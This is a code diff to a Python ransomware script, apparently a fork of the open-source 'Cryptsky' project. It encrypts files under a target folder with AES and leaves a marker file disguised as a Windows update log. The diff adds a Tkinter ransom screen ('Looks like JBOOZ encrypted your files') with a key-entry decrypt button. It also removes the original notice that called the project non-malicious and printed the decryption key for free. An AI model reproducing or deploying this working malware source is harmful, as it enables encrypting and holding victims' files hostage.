@@ -13,6 +13,7 @@ import tkinter
 # -----------------
 #  set to either: '128/192/256 bit plaintext key' or False
 HARDCODED_KEY = 'yellow submarine'
+START_DIR = ['C:\\CryptMe']
 
 
 def get_parser():
@@ -22,14 +23,53 @@ def get_parser():
     return parser
 
 
+def decrypt(key):
+    if check_key(key):
+        try:
+            os.remove(r'C:\Windows\Temp\winUpdater.log')
+        except FileNotFoundError:
+            pass
+
+        ctr = Counter.new(128)
+        crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
+        startdirs = START_DIR
+        for currentDir in startdirs:
+            for file in discover.discoverFiles(currentDir):
+                modify.modify_file_inplace(file, crypt.encrypt)
+        exit()
+    else:
+        pass
+
+
+
+def check_key(key):
+    if key == HARDCODED_KEY:
+        print("Key Match")
+        return True
+    else:
+        print("Key no match")
+        return False
+
+
 def post_encrypt():
+
     print("In Post")
     root = tkinter.Tk()
     frame = tkinter.Frame(root)
     frame.grid()
     frame.pack()
-    label = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯")
+    oops = tkinter.Label(frame, text="Oops... Looks like JBOOZ encrypted your files ¯\_(ツ)_/¯", font=('Helvetica', 20))
+    oops.pack()
+    label = tkinter.Label(frame, text="Enter the decryption key below", font=('Helvetica', 20))
     label.pack()
+    e = tkinter.Entry(frame, width=20, font=('Helvetica', 20))
+    e.pack()
+
+    def callback():
+        decrypt(e.get())
+
+    button = tkinter.Button(frame, text="Decrypt", font=('Helvetica', 20), width=10, command=callback)
+    button.pack()
     root.mainloop()
     pass
 
@@ -44,22 +84,6 @@ def main():
             os.remove(r'C:\Windows\Temp\winUpdater.log')
         except FileNotFoundError:
             pass
-        print('''
-Cryptsky!
----------------
-Your files have been encrypted. This is normally the part where I would
-tell you to pay a ransom, and I will send you the decryption key. However, this
-is an open source project to show how easy malware can be to write and to allow
-others to view what may be one of the first fully open source python ransomwares.
-
-This project does not aim to be malicious. The decryption key can be found
-below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
-your files forever. Do not include the surrounding quotes, but do make sure
-to match case, special characters, and anything else EXACTLY!
-Happy decrypting and be more careful next time!
-
-Your decryption key is: %s
-''' % HARDCODED_KEY)
         key = input('Enter Your Key> ')
 
     else:
@@ -69,7 +93,7 @@ Your decryption key is: %s
             print("Already Encrypted :)")
             # If this file exists, the system is already encrypted
             post_encrypt()
-            return 0
+            exit()
         except FileNotFoundError:
             # If this file does not exist, the system has not been encrypted yet... create the file
             file = open(r'C:\Windows\Temp\winUpdater.log', 'w+')
@@ -89,7 +113,7 @@ Your decryption key is: %s
     crypt = AES.new(key.encode(), AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['C:\\CryptMe']
+    startdirs = START_DIR
 
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
